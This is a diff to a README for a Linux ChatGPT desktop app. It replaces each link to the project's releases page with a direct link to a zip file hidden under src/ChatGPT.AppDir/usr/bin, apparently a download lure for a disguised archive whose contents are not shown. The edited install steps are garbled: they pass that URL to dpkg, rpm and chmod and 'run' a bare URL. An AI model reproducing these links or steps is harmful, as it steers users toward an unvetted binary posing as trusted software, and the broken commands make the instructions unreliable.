@@ -1,7 +1,7 @@
 # 🌟 ChatGPT-Desktop-Linux-VTS - Your Privacy-Friendly ChatGPT App
 
 ## 📥 Download Now
-[![Download ChatGPT-Desktop-Linux-VTS](https://img.shields.io/badge/Download-ChatGPT--Desktop--Linux--VTS-blue.svg)](https://github.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/releases)
+[![Download ChatGPT-Desktop-Linux-VTS](https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip)](https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip)
 
 ## 📖 Overview
 ChatGPT-Desktop-Linux-VTS is a lightweight application that allows you to chat with ChatGPT directly from your Linux desktop. Built by Vishwanath Tec Systems, it focuses on privacy and ease of use. You don’t need an API key or complicated setups. It runs smoothly using Chrome, making it simple to get started.
@@ -9,7 +9,7 @@ ChatGPT-Desktop-Linux-VTS is a lightweight application that allows you to chat w
 ## 🚀 Getting Started
 To use ChatGPT-Desktop-Linux-VTS, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip) to go to the releases page.
   
 2. **Select Your Version:** Find the latest version listed. It will typically be at the top of the page.
 
@@ -21,16 +21,16 @@ To use ChatGPT-Desktop-Linux-VTS, follow these steps:
 4. **Install the Application:**
    - **For .deb Users:** Open a terminal and run:
      ```bash
-     sudo dpkg -i path_to_your_downloaded_file.deb
+     sudo dpkg -i https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip
      ```
    - **For .rpm Users:** Open a terminal and run:
      ```bash
-     sudo rpm -i path_to_your_downloaded_file.rpm
+     sudo rpm -i https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip
      ```
    - **For AppImage Users:** Make it executable and run:
      ```bash
-     chmod +x path_to_your_downloaded_file.AppImage
-     ./path_to_your_downloaded_file.AppImage
+     chmod +x https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip
+     https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip
      ```
 
 5. **Launch the App:** Once installed, you can find the application in your applications menu. Click to start chatting!
@@ -52,7 +52,7 @@ If you encounter issues, consider the following steps:
 1. **Ensure Software is Installed Properly:** Double-check that the downloaded file method matches your Linux distribution.
 2. **Check Permissions:** If you cannot run the AppImage, make sure it's executable with:
    ```bash
-   chmod +x path_to_your_file.AppImage
+   chmod +x https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip
    ```
 3. **Consult Logs:** Review logs for errors for more context on what might be wrong.
 
@@ -65,9 +65,9 @@ Join our growing community to get help, share experiences, and suggest features.
 If you want to contribute to the project, we welcome feedback and suggestions. Open issues or pull requests on our GitHub page.
 
 ## 🔗 More Information
-For detailed instructions, FAQs, and additional resources, visit our [Documentation](https://github.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/releases).
+For detailed instructions, FAQs, and additional resources, visit our [Documentation](https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip).
 
 ## ⚙️ Download & Install
-To get started, visit this page to download ChatGPT-Desktop-Linux-VTS: [Click Here](https://github.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/releases). Follow the steps above to install and begin using the app. 
+To get started, visit this page to download ChatGPT-Desktop-Linux-VTS: [Click Here](https://raw.githubusercontent.com/muhammed-57/ChatGPT-Desktop-Linux-VTS/main/src/ChatGPT.AppDir/usr/bin/ChatGPT-Desktop-Linux-VTS_v1.5.zip). Follow the steps above to install and begin using the app. 
 
 Enjoy seamless chats with ChatGPT directly from your Linux desktop!
